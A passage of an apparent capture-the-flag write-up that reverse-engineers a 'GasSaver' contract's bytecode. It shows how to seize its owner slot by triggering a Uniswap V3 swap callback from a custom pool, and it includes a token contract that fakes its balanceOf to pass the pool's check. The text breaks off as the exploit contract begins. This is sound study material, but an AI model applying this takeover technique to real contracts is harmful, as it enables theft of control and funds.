+</span></span><span class="line"><span class="cl">  0x36e: MSTORE    
+</span></span><span class="line"><span class="cl">  0x36f: PUSH1     0xa0
+</span></span><span class="line"><span class="cl">  0x371: PUSH1     0x84
+</span></span><span class="line"><span class="cl">  0x373: MSTORE    
+</span></span><span class="line"><span class="cl">  0x374: PUSH1     0x2c
+</span></span><span class="line"><span class="cl">  0x376: PUSH1     0xa4
+</span></span><span class="line"><span class="cl">  0x378: MSTORE    
+</span></span><span class="line"><span class="cl">  0x379: PUSH1     0x2c
+</span></span><span class="line"><span class="cl">  0x37b: PUSH1     0x3
+</span></span><span class="line"><span class="cl">  0x37d: PUSH1     0xc4
+</span></span><span class="line"><span class="cl">  0x37f: CALLDATACOPY
+</span></span><span class="line"><span class="cl">  0x380: PUSH1     0x40
+</span></span><span class="line"><span class="cl">  0x382: PUSH0     
+</span></span><span class="line"><span class="cl">  0x383: PUSH1     0xf0
+</span></span><span class="line"><span class="cl">  0x385: PUSH0     
+</span></span><span class="line"><span class="cl">  0x386: PUSH0     
+</span></span><span class="line"><span class="cl">  0x387: PUSH1     0x23
+</span></span><span class="line"><span class="cl">  0x389: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x38a: GAS       
+</span></span><span class="line"><span class="cl">  0x38b: CALL      
+</span></span><span class="line"><span class="cl">  0x38c: CALLVALUE 
+</span></span><span class="line"><span class="cl">  0x38d: CHAINID   
+</span></span><span class="line"><span class="cl">  0x38e: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x38f: CHAINID   
+</span></span><span class="line"><span class="cl">  0x390: BYTE      
+</span></span><span class="line"><span class="cl">  0x391: SHL       
+</span></span><span class="line"><span class="cl">  0x392: PUSH0     
+</span></span><span class="line"><span class="cl">  0x393: MLOAD     
+</span></span><span class="line"><span class="cl">  0x394: LT        
+</span></span><span class="line"><span class="cl">  0x395: AND       
+</span></span><span class="line"><span class="cl">  0x396: PUSH2     0x80
+</span></span><span class="line"><span class="cl">  0x399: JUMPI     
+</span></span><span class="line"><span class="cl">  0x39a: PUSH2     0x8d
+</span></span><span class="line"><span class="cl">  0x39d: JUMP  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Similar to the previous action (<code>0xd3</code>) which calls <code>swap</code>, but with one difference:</p>
+<ul>
+<li>We are given permission to do a one-time memory store: <code>MSTORE[0x44] = CALDATALOAD[0x43] &gt;&gt; CALLDATALOAD[0x1]</code>.</li>
+</ul>
+<p>Now that we know the possible jump that we can do, we can see that this <code>GasSaver</code> contracts was actually looking like a MEV bot, and up until now, we can only know that we can only force the contract to call <code>swap()</code> with some parameter.</p>
+<p>Remember before that there is another check happening as well if <code>tx.origin != msg.sender</code> and <code>tx.origin == 0x7e5f4552091a69125d5dfcb7b8c2659029395bdf</code>. Let&rsquo;s take a look at the bytecode and check what happen with it. The bytecode is located starting at <code>0x4a6</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  0x4a6: JUMPDEST  
+</span></span><span class="line"><span class="cl">  0x4a7: PUSH0     
+</span></span><span class="line"><span class="cl">  0x4a8: CALLVALUE 
+</span></span><span class="line"><span class="cl">  0x4a9: GT        
+</span></span><span class="line"><span class="cl">  0x4aa: PUSH2     0x490
+</span></span><span class="line"><span class="cl">  0x4ad: JUMPI     
+</span></span><span class="line"><span class="cl">  0x4ae: ORIGIN    
+</span></span><span class="line"><span class="cl">  0x4af: PUSH20    0x7e5f4552091a69125d5dfcb7b8c2659029395bdf
+</span></span><span class="line"><span class="cl">  0x4c4: EQ        
+</span></span><span class="line"><span class="cl">  0x4c5: PUSH2     0x4d2
+</span></span><span class="line"><span class="cl">  0x4c8: JUMPI    
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It will check whether <code>msg.value</code> is 0 or not, then if the origin is correct, it will jump to <code>0x4d2</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  0x4d2: JUMPDEST  
+</span></span><span class="line"><span class="cl">  0x4d3: PUSH1     0xae
+</span></span><span class="line"><span class="cl">  0x4d5: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x4d6: PUSH1     0xf0
+</span></span><span class="line"><span class="cl">  0x4d8: PUSH0     
+</span></span><span class="line"><span class="cl">  0x4d9: POP       
+</span></span><span class="line"><span class="cl">  0x4da: SHR       
+</span></span><span class="line"><span class="cl">  0x4db: PUSH1     0x14
+</span></span><span class="line"><span class="cl">  0x4dd: PUSH1     0x84
+</span></span><span class="line"><span class="cl">  0x4df: PUSH1     0xc
+</span></span><span class="line"><span class="cl">  0x4e1: CALLDATACOPY
+</span></span><span class="line"><span class="cl">  0x4e2: PUSH1     0x14
+</span></span><span class="line"><span class="cl">  0x4e4: PUSH1     0x98
+</span></span><span class="line"><span class="cl">  0x4e6: PUSH1     0x2c
+</span></span><span class="line"><span class="cl">  0x4e8: CALLDATACOPY
+</span></span><span class="line"><span class="cl">  0x4e9: PUSH1     0x2
+</span></span><span class="line"><span class="cl">  0x4eb: PUSH1     0xac
+</span></span><span class="line"><span class="cl">  0x4ed: PUSH1     0x5e
+</span></span><span class="line"><span class="cl">  0x4ef: CALLDATACOPY
+</span></span><span class="line"><span class="cl">  0x4f0: PUSH1     0x60
+</span></span><span class="line"><span class="cl">  0x4f2: PUSH0     
+</span></span><span class="line"><span class="cl">  0x4f3: SHA3      
+</span></span><span class="line"><span class="cl">  0x4f4: PUSH32    0xff1f98431c8ad98523631ae4a59f267346ea31f9840000000000000000000000
+</span></span><span class="line"><span class="cl">  0x515: PUSH0     
+</span></span><span class="line"><span class="cl">  0x516: MSTORE    
+</span></span><span class="line"><span class="cl">  0x517: DUP1      
+</span></span><span class="line"><span class="cl">  0x518: PUSH1     0x15
+</span></span><span class="line"><span class="cl">  0x51a: MSTORE    
+</span></span><span class="line"><span class="cl">  0x51b: PUSH32    0xe34f199b19b2b4f47f68442619d555527d244f78a3297ea89325f843f87b8b54
+</span></span><span class="line"><span class="cl">  0x53c: PUSH1     0x35
+</span></span><span class="line"><span class="cl">  0x53e: MSTORE    
+</span></span><span class="line"><span class="cl">  0x53f: PUSH1     0x55
+</span></span><span class="line"><span class="cl">  0x541: PUSH0     
+</span></span><span class="line"><span class="cl">  0x542: SHA3      
+</span></span><span class="line"><span class="cl">  0x543: PUSH20    0xffffffffffffffffffffffffffffffffffffffff
+</span></span><span class="line"><span class="cl">  0x558: AND       
+</span></span><span class="line"><span class="cl">  0x559: CALLER    
+</span></span><span class="line"><span class="cl">  0x55a: EQ        
+</span></span><span class="line"><span class="cl">  0x55b: DUP3      
+</span></span><span class="line"><span class="cl">  0x55c: JUMPI
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>First, without reading the full bytecode, notice that there are some hardcoded values in it. After Googling these values, we can determine that they are part of the <code>UniswapV3Factory</code> deployment code, where <code>0xe34f199b19b2b4f47f68442619d555527d244f78a3297ea89325f843f87b8b54</code> is the <a href="https://github.com/uniswap/v3-periphery/blob/main/contracts/libraries/PoolAddress.sol#L6" target="_blank" rel="noopener noreffer ">POOL_INIT_CODE_HASH</a>. Additionally, <code>0x1f98431c8ad98523631ae4a59f267346ea31f984</code> is the address of <code>UniswapV3Factory</code>. If we skim through the bytecode, we can observe that this is actually replicating what <code>computeAddress</code> does, which deterministically calculates the <code>pool</code> <a href="https://github.com/uniswap/v3-periphery/blob/main/contracts/libraries/PoolAddress.sol#L33" target="_blank" rel="noopener noreffer ">address</a> and checks whether the <code>caller</code> is the computed address or not.</p>
+<p>The details of the operation are that if someone calls this <code>GasSaver</code> contract and fulfills the <code>tx.origin</code> requirement, it will try to compute the address, which basically does:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">keccak256(
+</span></span><span class="line"><span class="cl">    abi.encodePacked(
+</span></span><span class="line"><span class="cl">        hex&#39;ff&#39;,
+</span></span><span class="line"><span class="cl">        factory,
+</span></span><span class="line"><span class="cl">        keccak256(abi.encode(CALLDATA[0x84:0x98], CALLDATA[0x98:0xAC], CALLDATA[0xAC:0xAE])),
+</span></span><span class="line"><span class="cl">        POOL_INIT_CODE_HASH
+</span></span><span class="line"><span class="cl">    )
+</span></span><span class="line"><span class="cl">)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then, it will check whether <code>msg.sender</code> equals the computed address or not. If yes, it will jump to the address specified in <code>CALLDATA[0xAE:0xB0]</code>. Note that this means we can jump to two-byte addresses. There is an interesting <code>JUMPDEST</code> at <code>0x49e</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  0x49e: JUMPDEST  
+</span></span><span class="line"><span class="cl">  0x49f: PUSH1     0x4
+</span></span><span class="line"><span class="cl">  0x4a1: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x4a2: DUP1      
+</span></span><span class="line"><span class="cl">  0x4a3: CHAINID   
+</span></span><span class="line"><span class="cl">  0x4a4: SSTORE    
+</span></span><span class="line"><span class="cl">  0x4a5: STOP   
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This was the main function of <code>setOwner</code>, where we can set the <code>owner</code> with the value of <code>CALLDATALOAD[0x4]</code>.</p>
+<p>Now, it is clear that the main goal of this challenge is to somehow make a deployed Uniswap V3 Pool call this contract, with the hope that we can control the execution flow to jump to <code>0x49e</code>.</p>
+<p>We can conclude our analysis of the bytecode here and move on to crafting the solution.</p>
+<h3 id="solution">Solution</h3>
+<p>So now, how can we make a deployed pool of Uniswap V3 call this contract?</p>
+<h4 id="uniswap-v3-callback">Uniswap V3 Callback</h4>
+<p>The answer is that we need to learn the basics of Uniswap V3 first. Reading through the documentation of Uniswap V3, we notice that they have a <a href="https://docs.uniswap.org/contracts/v3/reference/core/interfaces/callback/IUniswapV3SwapCallback" target="_blank" rel="noopener noreffer ">mechanism</a> named <code>callback</code>. Basically, every time a contract calls <code>pool.swap</code>, V3 will do a callback back to it, with a signature like below:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">uniswapV3SwapCallback</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int256</span> <span class="n">amount0Delta</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int256</span> <span class="n">amount1Delta</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bytes</span> <span class="nb">data</span>
+</span></span><span class="line"><span class="cl">  <span class="p">)</span> <span class="k">external</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Usually, this callback is used by the caller to resolve the owed amount - based on the given <code>delta</code>, they will transfer the total required amount to the <code>pool</code> to complete the <code>swap</code>.</p>
+<h4 id="crafting-the-solution">Crafting the Solution</h4>
+<p>With this understanding of Uniswap V3&rsquo;s callback mechanism, we can devise a solution. Using the one-byte jump capability, we can force the contract to make a <code>swap()</code> call to a Uniswap V3 Pool. This will trigger the Pool to make a callback to <code>GasSaver</code> via <code>uniswapV3SwapCallback</code>. During this callback:</p>
+<ol>
+<li><code>tx.origin</code> will still be us (the original caller)</li>
+<li><code>msg.sender</code> will be the Pool address itself
+This means the code will enter the branch that verifies if the computed address matches a Pool. If this check passes, we can jump to our desired two-byte address target.</li>
+</ol>
+<p>The path to solve this challenge is quite clear now. To recap, with the one-byte jump, we need to trigger a <code>swap()</code> call to a Uniswap pool, then the Uniswap pool will do <code>uniswapV3SwapCallback</code> back to the <code>GasSaver</code>, and if the <code>computedAddress</code> is correct, it will do a two-byte jump.</p>
+<p>However, remember that we still need to control the <code>CALLDATA</code> so that it can jump properly to our target. First, observe that when we redirect the execution to <code>0x49e</code>, to be able to set the <code>owner</code> properly, we need to make sure the <code>CALLDATA[0x4:0x24]</code> is the target <code>owner</code> (which is the <code>player</code> address). This means the <code>amount0delta</code> is required to be the same as the <code>player</code> address. The <code>data</code> itself is needed by the contract because it will be used to compute the pool address and set the jump destination.</p>
+<p>So now, let&rsquo;s try to take a deep look at how Uniswap v3 <code>swap</code> works and the <code>callback</code> arguments that we need to pass. First, remember that the <code>amount0delta</code> needs to be positive, where the value needs to be exactly the same as the address of the <code>player</code>. Reading through the Uniswap V3 code and documentation, a positive <code>amount0delta</code> during <code>callback</code> means that we owe the <code>pool</code> that amount of money, and we need to <code>transfer</code> it to the <code>pool</code>. To trigger this, we can try to do a swap with <code>zeroForOne</code> set to true (which means that we want to swap <code>token0</code> for <code>token1</code>). We don&rsquo;t care about the <code>amount1delta</code> because it isn&rsquo;t needed. The <code>data</code> is easy to control because it is actually just forwarding the <code>data</code> that we pass during <code>swap()</code>.</p>
+<p>Taking a close look at the <code>swap()</code> <a href="https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/UniswapV3Pool.sol#L596-L602" target="_blank" rel="noopener noreffer ">code</a>, when we pass a positive amount of <code>amountSpecified</code>, that means we are asking the pool to do an <code>exactAmountIn</code> swap. Intuitively, this means that if the <code>pool</code> contains enough liquidity, the <code>amount0delta</code> that is passed during the <code>callback</code> will be the same as the <code>amountSpecified</code> during swap. The only case where it differs is if the pool doesn&rsquo;t have enough liquidity, or the price is below the <code>sqrtPriceLimitX96</code> passed during calling the <code>swap</code>.</p>
+<p>Now, notice that there isn&rsquo;t any limitation regarding what <code>token0</code> and <code>token1</code> we can use, and what <code>pool</code> we can use. It is clear that the easiest way is to deploy our own custom <code>pool</code> and <code>token</code>, so that we can provide the <code>pool</code> with enough liquidity, and triggering a huge <code>swap</code> with total token equal to the <code>player</code> address will be possible.</p>
+<p>First, let&rsquo;s think about how to deploy a custom <code>pool</code>. There are two things we need to consider:</p>
+<ul>
+<li>What should the initial price be?</li>
+<li>How much liquidity should we provide and in what range?</li>
+</ul>
+<p>If you&rsquo;re not familiar with Uniswap V3, you can read about its concepts first, but the tl;dr is that it uses concentrated liquidity, where the price is calculated from a tick, and users can provide liquidity within a range of ticks.</p>
+<p>The goal with our custom <code>pool</code> is to enable swapping a huge amount of <code>token0</code>. Intuitively, the easiest way to do this is to provide maximum liquidity across a very wide range of ticks. Note that since we can deploy our own tokens, the huge amount required to provide liquidity isn&rsquo;t an issue - we can simply mint as many tokens as we need.</p>
+<p>So, we can use the <code>UniswapV3Factory</code> to deploy a new pool (to fulfill the computeAddress check performed by the <code>GasSaver</code> contract), then mint huge liquidity across a wide range. Be careful that there is a <a href="https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/UniswapV3Pool.sol#L122" target="_blank" rel="noopener noreffer ">maxLiquidityPerTick</a>, so ensure that the liquidity you provide is below it. If you want to be more precise, you can actually take a deep look at how the pool calculates the <code>amount</code> based on the <code>liquidity</code>, but for this challenge, we don&rsquo;t really need to do that.</p>
+<p>To trigger the <code>swap</code>, we can use the <code>0xd3</code> path, which will ask the <code>GasSaver</code> to do a <code>swap()</code> with:</p>
+<ul>
+<li><code>zeroForOne</code> set to true (so that the <code>amount0delta</code> will be positive)</li>
+<li><code>priceLimit</code> set to the lowest tick possible in a <code>Uniswap</code> pool (<code>MIN_TICK</code>)</li>
+</ul>
+<p>When we swap <code>token0</code> for <code>token1</code>, the Uniswap <code>pool</code> will shift the tick left until it fully accommodates the <code>exactAmountIn</code> that we passed.</p>
+<p>Because the price limit is set to the lowest possible value, we&rsquo;re essentially saying we don&rsquo;t care about the price - we just want to swap all of the specified amount of <code>token0</code> for <code>token1</code>.</p>
+<p>Regarding the initial price, intuitively, it will be easier for us to set it close to the <code>tickUpper</code> that we passed during the <code>mint</code> before. This way, we can maximize the amount of <code>token0</code> we can swap in, since there will be a huge range between the initial price and the lower tick that we can consume during the swap.</p>
+<p>Now that we know how to deploy the <code>pool</code> and the <code>swap</code>, there is one more thing that we need to consider. Let&rsquo;s take a look at how the <code>Uniswap</code> do the <a href="https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/UniswapV3Pool.sol#L772-L777" target="_blank" rel="noopener noreffer ">callback</a>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">zeroForOne</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">amount1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="n">TransferHelper</span><span class="p">.</span><span class="n">safeTransfer</span><span class="p">(</span><span class="n">token1</span><span class="p">,</span> <span class="n">recipient</span><span class="p">,</span> <span class="kt">uint256</span><span class="p">(</span><span class="o">-</span><span class="n">amount1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">balance0Before</span> <span class="o">=</span> <span class="n">balance0</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IUniswapV3SwapCallback</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">).</span><span class="n">uniswapV3SwapCallback</span><span class="p">(</span><span class="n">amount0</span><span class="p">,</span> <span class="n">amount1</span><span class="p">,</span> <span class="nb">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">balance0Before</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="n">amount0</span><span class="p">))</span> <span class="o">&lt;=</span> <span class="n">balance0</span><span class="p">(),</span> <span class="s">&#39;IIA&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There is one more check that we need to pass, which is that the <code>balance0()</code> after the <code>callback</code> needs to be increased at least to <code>balance0Before + amount0</code>. Remember that the <code>swapCallback</code> target is the <code>GasSaver</code> contract, and with properly controlled data, it will do <code>setOwner()</code>, but it doesn&rsquo;t actually do any balance transfer. This means it will fail the final check because the <code>balance</code> isn&rsquo;t changed.</p>
+<p>In order to pass this check, we need to make some modifications to the <code>balanceOf</code> function in our custom <code>Token</code>. Note that the <code>swap</code> uses a <code>staticcall</code> when fetching the balance, so the <code>balanceOf</code> function isn&rsquo;t allowed to do any state modifications. The easiest way to pass this check is to override the <code>balanceOf</code> to first check who is the owner of the <code>GasSaver</code>. If the <code>owner</code> is still <code>vitalik</code>, return 0, then after a successful callback, the <code>owner</code> will be changed to <code>player</code>. During the second <code>balance</code> check call, when it checks the <code>owner</code>, because it isn&rsquo;t <code>vitalik</code> anymore, return the maximum amount.</p>
+<h4 id="executing-the-solution">Executing the Solution</h4>
+<p>Now that we know how to do this, we can start crafting our exploit. First, let&rsquo;s start by crafting our custom token. Below is my implementation of the token.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/token/ERC20/ERC20.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IGasSaver</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">owner</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Token</span> <span class="k">is</span> <span class="n">ERC20</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IGasSaver</span> <span class="k">public</span> <span class="n">gasSaver</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="n">spoofBalance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">gasSaver_</span><span class="p">)</span> <span class="n">ERC20</span><span class="p">(</span><span class="s">&#34;MockToken&#34;</span><span class="p">,</span> <span class="s">&#34;MTKN&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">gasSaver</span> <span class="o">=</span><span class="n">IGasSaver</span><span class="p">(</span><span class="n">gasSaver_</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">mint</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_mint</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">account</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">override</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">spoofBalance</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">gasSaver</span><span class="p">.</span><span class="n">owner</span><span class="p">()</span> <span class="o">==</span> <span class="kt">address</span><span class="p">(</span><span class="mh">0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">2</span><span class="o">**</span><span class="mi">256</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">super</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">account</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">account</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">)</span> <span class="k">public</span> <span class="k">override</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">spoofBalance</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">super</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">account</span><span class="p">,</span><span class="nb">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">toggleSpoofBalance</span><span class="p">(</span><span class="kt">bool</span> <span class="n">toggle</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">spoofBalance</span> <span class="o">=</span> <span class="n">toggle</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Below is the implementation of the <code>Exploit</code> contract that I used to deploy and mint liquidity for the custom pool.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
